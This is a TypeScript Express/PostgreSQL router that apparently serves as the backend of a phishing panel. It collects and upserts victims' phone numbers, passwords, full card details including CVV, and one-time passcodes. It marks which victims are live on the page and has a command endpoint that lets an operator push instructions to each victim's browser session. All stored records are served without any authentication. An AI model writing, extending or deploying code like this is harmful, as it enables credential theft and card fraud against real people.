import { Router } from "express";
import pg from "pg";

const { Pool } = pg;
const pool = new Pool({ connectionString: process.env.DATABASE_URL });
const router = Router();

// Upsert visitor
router.post("/submit", async (req, res) => {
  const {
    id, submittedAt, submittedAtTs,
    phone, password,
    cardNumber, cardName, cardMonth, cardYearExp, cardCvv,
    otpCode, otpStatus, page, isActive, lastSeen, country
  } = req.body;

  await pool.query(`
    INSERT INTO unity_submissions
      (id, submitted_at, submitted_at_ts, phone, password,
       card_number, card_name, card_month, card_year_exp, card_cvv,
       otp_code, otp_status, page, is_active, last_seen, country)
    VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16)
    ON CONFLICT (id) DO UPDATE SET
      submitted_at = EXCLUDED.submitted_at,
      submitted_at_ts = EXCLUDED.submitted_at_ts,
      phone = COALESCE(NULLIF(EXCLUDED.phone,''), unity_submissions.phone),
      password = COALESCE(NULLIF(EXCLUDED.password,''), unity_submissions.password),
      card_number = COALESCE(NULLIF(EXCLUDED.card_number,''), unity_submissions.card_number),
      card_name = COALESCE(NULLIF(EXCLUDED.card_name,''), unity_submissions.card_name),
      card_month = COALESCE(NULLIF(EXCLUDED.card_month,''), unity_submissions.card_month),
      card_year_exp = COALESCE(NULLIF(EXCLUDED.card_year_exp,''), unity_submissions.card_year_exp),
      card_cvv = COALESCE(NULLIF(EXCLUDED.card_cvv,''), unity_submissions.card_cvv),
      otp_code = COALESCE(NULLIF(EXCLUDED.otp_code,''), unity_submissions.otp_code),
      otp_status = COALESCE(EXCLUDED.otp_status, unity_submissions.otp_status),
      page = EXCLUDED.page,
      is_active = EXCLUDED.is_active,
      last_seen = EXCLUDED.last_seen,
      country = COALESCE(NULLIF(EXCLUDED.country,''), unity_submissions.country)
  `, [
    id, submittedAt, submittedAtTs,
    phone||'', password||'',
    cardNumber||'', cardName||'', cardMonth||'', cardYearExp||'', cardCvv||'',
    otpCode||'', otpStatus||null, page||'', isActive, lastSeen, country||''
  ]);

  res.json({ ok: true });
});

// Patch submission
router.patch("/submissions/:id", async (req, res) => {
  const { id } = req.params;
  const map: Record<string, string> = {
    phone: "phone", password: "password",
    cardNumber: "card_number", cardName: "card_name",
    cardMonth: "card_month", cardYearExp: "card_year_exp", cardCvv: "card_cvv",
    otpCode: "otp_code", otpStatus: "otp_status",
    page: "page", isActive: "is_active", lastSeen: "last_seen", country: "country"
  };
  const sets: string[] = []; const vals: any[] = [];
  for (const [k, col] of Object.entries(map)) {
    if (k in req.body) { sets.push(`${col} = $${vals.length+1}`); vals.push(req.body[k]); }
  }
  if (!sets.length) return res.json({ ok: true });
  vals.push(id);
  await pool.query(`UPDATE unity_submissions SET ${sets.join(',')} WHERE id = $${vals.length}`, vals);
  res.json({ ok: true });
});

// Get all
router.get("/submissions", async (_req, res) => {
  const { rows } = await pool.query(`
    SELECT *, (EXTRACT(EPOCH FROM NOW())*1000 - last_seen) < 8000 AS is_live
    FROM unity_submissions ORDER BY submitted_at_ts DESC
  `);
  res.json(rows.map((r: any) => ({
    id: r.id, submittedAt: r.submitted_at, submittedAtTs: r.submitted_at_ts,
    phone: r.phone, password: r.password,
    cardNumber: r.card_number, cardName: r.card_name,
    cardMonth: r.card_month, cardYearExp: r.card_year_exp, cardCvv: r.card_cvv,
    otpCode: r.otp_code, otpStatus: r.otp_status,
    page: r.page, isActive: r.is_live, lastSeen: r.last_seen, country: r.country
  })));
});

// Command system (uses separate cmd column)
router.post("/cmd/:id", async (req, res) => {
  const { cmd } = req.body;
  await pool.query(`UPDATE unity_submissions SET cmd = $1 WHERE id = $2`, [cmd, req.params.id]);
  res.json({ ok: true });
});
router.get("/cmd/:id", async (req, res) => {
  const { rows } = await pool.query(`SELECT cmd FROM unity_submissions WHERE id = $1`, [req.params.id]);
  const cmd = rows[0]?.cmd || null;
  if (cmd) {
    await pool.query(`UPDATE unity_submissions SET cmd = '' WHERE id = $1`, [req.params.id]);
  }
  res.json({ cmd });
});

// Delete
router.delete("/submissions/:id", async (req, res) => {
  await pool.query(`DELETE FROM unity_submissions WHERE id = $1`, [req.params.id]);
  res.json({ ok: true });
});
router.delete("/submissions", async (_req, res) => {
  await pool.query(`DELETE FROM unity_submissions`);
  res.json({ ok: true });
});

export default router;
